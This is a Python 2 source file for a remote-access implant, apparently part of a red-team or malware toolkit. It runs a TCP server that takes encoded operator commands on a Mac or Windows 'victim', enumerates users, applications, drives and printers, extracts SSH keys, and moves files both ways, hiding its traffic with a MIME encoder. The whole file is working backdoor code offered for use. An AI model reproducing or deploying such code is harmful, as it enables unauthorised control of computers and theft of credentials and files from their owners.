import os
import platform
import SocketServer
import sys

from .os_types.macintosh import Mac
from .os_types.windows import Windows
from .encoders.mime import Mime

cipher = Mime()
    
class ImplantHandler(SocketServer.BaseRequestHandler):
    
    def handle(self):
        if platform.system() == 'Darwin':
            victim = Mac()
        elif platform.system() == 'Windows':
            victim = Windows()
        else:
            self.request.sendall("Unknown OS: " + platform.system + ". Please proceed with caution.")

        while True:
            try:
                cmd = cipher.decode(self.request.recv(1024)).strip()
                
                if cmd == "enum_os":
                    self.request.sendall(cipher.encode(victim.enum_os()))
                elif cmd == "enum_users":
                    self.request.sendall(cipher.encode(victim.enum_users()))
                elif cmd == "enum_applications":
                    self.request.sendall(cipher.encode(victim.enum_applications()))
                elif cmd == "enum_drives":
                    self.request.sendall(cipher.encode(victim.enum_drives()))
                elif cmd == "enum_printers":
                    self.request.sendall(cipher.encode(victim.enum_printers()))
                elif cmd == "get_ssh_keys":
                    self.request.sendall(cipher.encode(victim.get_ssh_keys()))
                elif cmd.startswith('upload') == True:
                    saveMeFile = cmd[7:].split(' ')[1]
                    
                    if os.path.isfile(saveMeFile):
                        break 
                    else:   
                        try:
                            with open(saveMeFile, 'wb') as f:
                                receiving = True
                                while receiving:
                                    data = self.request.recv(1024)
                                    if "EOF!EOF!" in data:
                                        data = data[:-8]
                                        receiving = False
                                    data = cipher.decode(data)
                                     
                                    if not data:
                                        break
                                    elif  "EOF!EOF!" in data: 
                                        f.write(data[:-8])
                                        receiving = False
                                    else:
                                        f.write(data)
                        except: 
                            pass     
                elif cmd.startswith('download') == True:
                    sendMeFile = cmd[9:].split(' ')[0]
                    
                    with open(sendMeFile, 'rb') as f:
                        while True:
                            data = f.read(1024)

                            if not data:
                                break
                            else:
                                self.request.sendall(cipher.encode(data)) 
                    self.request.sendall("EOF!EOF!") 
                else:
                    self.request.sendall(cipher.encode("unknown command\n"))
            except Exception as e: 
                print 'Uh no!', e
                self.server.close_request(self.request)
                sys.exit(1)

def spawn(HOST="localhost", PORT=8080):
    server = None
    try:
        SocketServer.TCPServer.allow_reuse_address = True
        server = SocketServer.TCPServer((HOST, PORT), ImplantHandler)
        print "[+] Implant active...Terminate w/ Ctrl-C\n"
        server.serve_forever()
    except KeyboardInterrupt:
        server.shutdown()
    except:
        print "[!] Couldn't start server"
    finally:
        if server == None:
            print 'Could not bind to socket'
        else:
            print 'Shutting down server'
            server.shutdown()
